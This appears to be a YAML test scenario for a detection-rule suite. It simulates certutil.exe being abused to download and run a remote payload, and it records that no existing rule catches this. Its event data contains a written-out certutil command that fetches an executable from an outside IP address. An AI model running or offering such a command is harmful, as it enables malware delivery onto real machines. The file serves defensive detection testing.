name: lolbin_download
description: >
  A signed, trusted Windows binary (certutil.exe) is abused to pull a
  remote payload to disk, bypassing tooling that only alerts on
  known-bad downloaders. Classic living-off-the-land ingress technique.

  COVERAGE GAP: no rule in rules/ or sigma-rules/ matches certutil.exe or
  bitsadmin.exe — same gap as service_persistence.yaml, every existing
  rule only checks powershell.exe or cmd.exe. This scenario intentionally
  expects nothing to fire; it documents the gap rather than being fitted
  to pass against an unrelated existing rule.
mitre_techniques:
  - T1105
  - T1218

events:
  - timestamp: "2026-07-24T22:31:19Z"
    hostname: WORKSTATION-31
    username: "CORP\\jkim"
    process_name: certutil.exe
    parent_process: cmd.exe
    command_line: "certutil.exe -urlcache -f http://185.220.101.44/payload.exe C:\\Users\\Public\\payload.exe"

  - timestamp: "2026-07-24T22:31:22Z"
    hostname: WORKSTATION-31
    username: "CORP\\jkim"
    process_name: payload.exe
    parent_process: cmd.exe
    command_line: "C:\\Users\\Public\\payload.exe"

# Deliberately empty: no rule currently covers certutil/bitsadmin LOLBin
# ingress (T1105/T1218).
expected_detections: []
